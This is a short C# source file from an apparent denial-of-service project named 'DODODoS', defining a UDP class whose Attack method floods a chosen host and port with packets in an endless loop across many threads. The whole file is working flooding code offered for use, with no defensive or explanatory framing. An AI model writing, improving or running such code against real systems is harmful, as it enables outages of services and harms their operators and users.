using System;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

namespace DODODoS
{
    public class UDP
    {
        UdpClient client;
        public UDP()
        {
            client = new UdpClient();
        }

        public bool Connect(string host, int port)
        {
            try
            {
                client.Connect(host, port);
                return true;
            }
            catch (SocketException e)
            {
                return false;
            }
        }

        public bool Attack(byte[] message, int thread)
        {
            if (thread == 1)
            {
                while (true)
                {
                    try
                    {
                        client.Client.Send(message);
                    }
                    catch (SocketException e)
                    {
                        return false;
                    }
                }
            }
            else
            {
                for (int i = 0; i < thread; i++)
                {
                    new Thread(() => Attack(message, 1)).Start();
                }
            }
            return true;
        }
    }
}
